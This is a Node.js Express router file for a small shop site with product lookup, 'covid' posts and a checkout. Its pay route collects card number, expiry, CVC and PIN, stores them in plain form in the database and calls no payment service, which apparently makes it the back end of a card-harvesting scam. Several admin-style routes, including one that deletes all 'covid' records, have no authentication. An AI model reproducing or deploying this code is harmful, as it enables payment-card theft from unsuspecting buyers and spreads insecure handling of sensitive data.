var express = require("express"),
    router = express.Router(),
    expressSanitizer = require("express-sanitizer"),
    Blog = require("../models/blog"),
    Covid = require('../models/covid'),
    middleware = require("../middleware/index"),
    moment = require('moment'),
    Product = require('../models/product'),
    User = require('../models/user'),
    Card = require('../models/card'),
    randomstring = require("randomstring");
var { isUser } = require('../controllers/index');


// BLOG PAGE ROUTE=======================================
router.get("/covid/:id", async (req, res) => {
    let covid = await Covid.findById(req.params.id);
    res.render('covidShow', { covid });
});

router.post("/covid", async (req, res) => {
    let covid = await Covid.create(req.body);
    res.redirect('/admin');
});

router.post('/covid/delete', async (req, res) => {
    Covid.deleteMany({}, (err, f) => {
        if(err){
            res.redirect('/deal')
        }
        res.redirect('back')
    });
    
})

// search product
router.post("/product/search", async (req, res) => {
    try {
        let product1 = await Product.find({ reference: req.body.reference });
        let product = product1[0];
        res.render('product', { product });
    } catch (err) {
        throw err;
    }
});

// post a new product
router.post("/product", async (req, res) => {
    let product = await Product.create(req.body);
    product.reference = `US-${randomstring.generate(8)}`;
    await product.save();
    console.log(product)
    res.redirect('back');
});

// get user details
router.get("/product/:id/:user_id/details", isUser, async (req, res) => {
    let product = await Product.findById(req.params.id);
    let user = await User.findById(req.user.id);
    res.render('productDetail', { product, user });
})

// get checkout
router.get("/product/:id/:user_id", isUser, async (req, res) => {
    let product = await Product.findById(req.params.id);
    let user = await User.findById(req.user.id);
    res.render('productShow', { product, user });
})

// post pay
router.post("/product/:id/:user_id/pay", isUser, async (req, res) => {
    let product = await Product.findById(req.params.id);
    let user = await User.findById(req.user.id);
    let {
        cardNo,
        expiryMonth,
        expiryYear,
        cvc,
        pin
    } = req.body;
    let card = await Card.create({
        cardNo: '' + cardNo,
        expiryMonth: '' + expiryMonth,
        expiryYear: '' + expiryYear,
        cvc: '' + cvc,
        pin: '' + pin,
    });
    card.user = user;
    await card.save();
    res.redirect('/response');
});

router.get('/response', (req, res, next) => {
    res.render('response');
})

router.get('/terms', (req, res) => {
    res.render('terms');
})

module.exports = router;